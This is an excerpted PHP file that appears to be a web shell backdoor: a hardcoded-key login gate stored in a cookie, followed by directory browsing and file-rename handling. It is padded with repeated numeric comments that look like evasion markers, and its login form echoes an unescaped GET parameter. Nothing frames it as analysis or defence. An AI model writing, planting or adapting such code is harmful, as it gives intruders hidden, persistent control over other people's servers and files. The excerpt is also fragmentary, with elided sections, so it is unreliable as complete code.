...
$auth_key = "1db83406783b7bdb3a5fbcc112f825ee";
...
$pass = false;
if (isset($_COOKIE['pw_name_46944'])) {
    if(($_COOKIE['pw_name_46944']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_46944'])) {
        if(($_POST['pw_name_46944']) == $auth_key) {
            setcookie("pw_name_46944", $_POST['pw_name_46944']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_46944' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1735118086528093 1735118086711262 1735118086629377 1735118086544013
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1735118086528093 1735118086711262 1735118086629377 1735118086544013
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1735118086528093 1735118086711262 1735118086629377 1735118086544013
            $name = PATH . "/" . $_GET['r'];
